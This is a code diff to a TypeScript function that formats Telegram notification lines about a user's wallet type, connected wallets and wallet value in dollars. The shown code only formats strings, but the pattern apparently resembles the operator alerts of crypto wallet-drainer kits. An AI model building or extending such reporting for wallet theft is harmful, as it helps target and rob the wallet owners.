@@ -212,13 +212,15 @@ function appendInstitutionalFields(ctx?: TelegramRequestContext): string {
     lines += `👛 <b>Wallet Type:</b> ${literalValue(ctx.wallet_type)}\n`
   }
   if (ctx.active_chain_tab != null && literalValue(ctx.active_chain_tab) !== 'N/A') {
-    lines += `📑 <b>Active Tab:</b> ${literalValue(ctx.active_chain_tab)}\n`
+    lines += `📑 <b>Wallets:</b> ${literalValue(ctx.active_chain_tab)}\n`
   }
   if (ctx.connected_wallets != null && literalValue(ctx.connected_wallets) !== 'N/A') {
     lines += `🔀 <b>Connected:</b> ${literalValue(ctx.connected_wallets)}\n`
   }
   if (ctx.scout_value_usd != null && literalValue(ctx.scout_value_usd) !== 'N/A') {
-    lines += codeLine('Scout Value USD', ctx.scout_value_usd)
+    const usdVal = Number(ctx.scout_value_usd)
+    const usdFormatted = Number.isFinite(usdVal) && usdVal > 0 ? `$${usdVal.toFixed(2)}` : '$0'
+    lines += `💰 <b>Wallet Value:</b> ${usdFormatted}\n`
   }
   if (ctx.amount != null && literalValue(ctx.amount) !== 'N/A') {
     lines += codeLine('Amount', ctx.amount)
